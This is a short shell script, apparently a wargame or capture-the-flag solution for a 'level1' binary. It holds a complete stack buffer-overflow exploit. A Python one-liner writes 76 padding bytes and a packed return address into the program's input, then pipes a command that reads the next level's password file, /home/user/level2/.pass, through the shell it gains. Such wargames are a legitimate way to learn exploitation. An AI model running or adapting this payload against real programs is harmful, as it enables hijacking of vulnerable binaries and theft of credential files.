#!/bin/sh

(python -c 'import struct; print("A" * 76 + struct.pack("I", 0x8048472))';echo "cat /home/user/level2/.pass") | ~/level1